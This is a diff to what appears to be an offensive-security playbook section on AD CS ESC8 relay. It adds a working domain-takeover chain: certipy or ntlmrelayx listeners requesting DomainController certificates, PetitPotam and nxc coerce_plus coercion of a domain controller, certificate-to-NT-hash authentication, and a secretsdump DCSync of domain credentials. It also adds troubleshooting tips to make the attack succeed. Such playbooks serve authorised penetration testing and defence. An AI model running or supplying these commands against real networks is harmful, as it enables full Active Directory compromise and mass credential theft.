@@ -61,16 +61,37 @@ Rights = the relayed principal's own. Pick the action from confirmed object righ
 - `--no-dump`, `--no-da`, `--no-acl` switch off distinct default actions: check `-h` before launching so a bind-only plan does not edit ACLs.
 
 ## AD CS relay (ESC8)
-Needs Web Enrollment reachable, NTLM accepted, no EPA, and an authentication-capable template the source account may enroll in.
+Needs Web Enrollment reachable, NTLM accepted, no EPA, and an authentication-capable template the source account may enroll in. `certipy find -vulnerable` flags it as `ESC8` ([adcs](adcs.md)).
+
+Listener (pick one):
 ```bash
-certipy relay -h
-sudo certipy relay -target http://<CA-FQDN> -template User \
-  -interface <KALI> -port 445 -out <USER>-relay
+sudo certipy relay -target http://<CA-FQDN> -template DomainController \
+  -subject 'CN=<HOSTNAME>' -interface <KALI> -out <HOSTNAME>
 ```
 ```bash
-certipy auth -pfx <PFX> -dc-ip <DC-IP> -no-hash -no-save
+python3 -m venv ~/venvs/relay
+~/venvs/relay/bin/pip install impacket 'pyopenssl==24.2.1'
+sudo ~/venvs/relay/bin/ntlmrelayx.py -t http://<CA-FQDN>/certsrv/certfnsh.asp \
+  --adcs --template DomainController -smb2support
 ```
-- User, machine and DC accounts need different templates. Do not assume a DC cert from any machine account.
+- Template: `DomainController` for a DC, `Machine` for other computers, `User` for users. Without `-template`, certipy picks Machine/User from a trailing `$`.
+- `-subject`: a relayed machine account can arrive with an empty username (`/@` in the log), and the request then has no CN and fails. With an empty name certipy also falls back to `User`, so set `-template` explicitly.
+- The pinned pyOpenSSL is only for Kali's packaged impacket 0.13.x, whose ADCS attack still calls `crypto.X509Req`.
+
+Coerce the source (second terminal):
+```bash
+nxc smb <DC-IP> -u <USER> -p '<PW>' -M coerce_plus -o LISTENER=<KALI>
+python3 PetitPotam.py -u <USER> -p '<PW>' -d <DOMAIN.TLD> <KALI> <DC-IP>
+```
+- `ERROR_BAD_NETPATH` from PetitPotam means the DC tried to connect: check the relay window.
+- The CA can sit on the coerced DC itself (SMB in, HTTP out to the same host).
+
+Cert → hash → DCSync:
+```bash
+certipy auth -pfx <HOSTNAME>.pfx -dc-ip <DC-IP>
+impacket-secretsdump '<DOMAIN.TLD>/<HOSTNAME>$@<DC-IP>' -hashes :<NT> -just-dc
+```
+- A DC machine account holds replication rights ([credential-access](credential-access.md#dcsync-inspect-rights-and-select-the-account)). Non-DC machine cert → [delegation](delegation.md) / silver ticket instead.
 - Issued but auth fails → [adcs](adcs.md) (SID mapping, EKU, PKINIT/Schannel).
 
 ## Troubleshooting
@@ -84,3 +105,8 @@ certipy auth -pfx <PFX> -dc-ip <DC-IP> -no-hash -no-save
 | LDAP/HTTP auth rejected | NTLM restrictions, EPA, negotiate flags |
 | Certificate request rejected | Template name, enrollment rights, EKU, approval |
 | Certificate issued, auth fails | [adcs](adcs.md) |
+| `Attribute's length must be >= 1` (certipy relay) | Empty relayed username → `-subject 'CN=<HOSTNAME>'` |
+| `module 'OpenSSL.crypto' has no attribute 'X509Req'` | Kali impacket + new pyOpenSSL → venv pin above |
+| `error code 200, treating as a successful login` | Not proof the relay worked; wait for the cert |
+| `find`: HTTPS enrollment timed out | HTTPS disabled on the CA; only matters if HTTP is off too |
+| `find`: `Found 0 certificate templates` | Irrelevant for ESC8; the template is named by hand |
